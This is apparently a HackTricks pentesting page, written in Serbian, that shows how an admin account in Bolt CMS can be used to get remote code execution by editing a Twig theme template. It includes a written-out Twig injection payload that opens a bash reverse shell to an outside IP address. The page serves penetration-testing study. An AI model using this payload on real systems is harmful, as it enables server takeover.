# Bolt CMS

{{#include ../../banners/hacktricks-training.md}}

## RCE

Nakon prijave kao admin (idite na /bot da pristupite login promptu), možete dobiti RCE u Bolt CMS:

- Izaberite `Configuration` -> `View Configuration` -> `Main Configuration` ili idite na URL putanju `/bolt/file-edit/config?file=/bolt/config.yaml`
- Proverite vrednost teme

<figure><img src="../../images/image (771).png" alt=""><figcaption></figcaption></figure>

- Izaberite `File management` -> `View & edit templates`
- Izaberite osnovnu temu pronađenu u prethodnom (`base-2021` u ovom slučaju) koraku i izaberite `index.twig`
- U mom slučaju ovo je u URL putanji /bolt/file-edit/themes?file=/base-2021/index.twig
- Postavite svoj payload u ovu datoteku putem [template injection (Twig)](../../pentesting-web/ssti-server-side-template-injection/#twig-php), kao: `{{['bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"']|filter('system')}}`
- I sačuvajte promene

<figure><img src="../../images/image (948).png" alt=""><figcaption></figcaption></figure>

- Očistite keš u `Maintenance` -> `Clear the cache`
- Ponovo pristupite stranici kao običan korisnik, i payload bi trebao biti izvršen

{{#include ../../banners/hacktricks-training.md}}
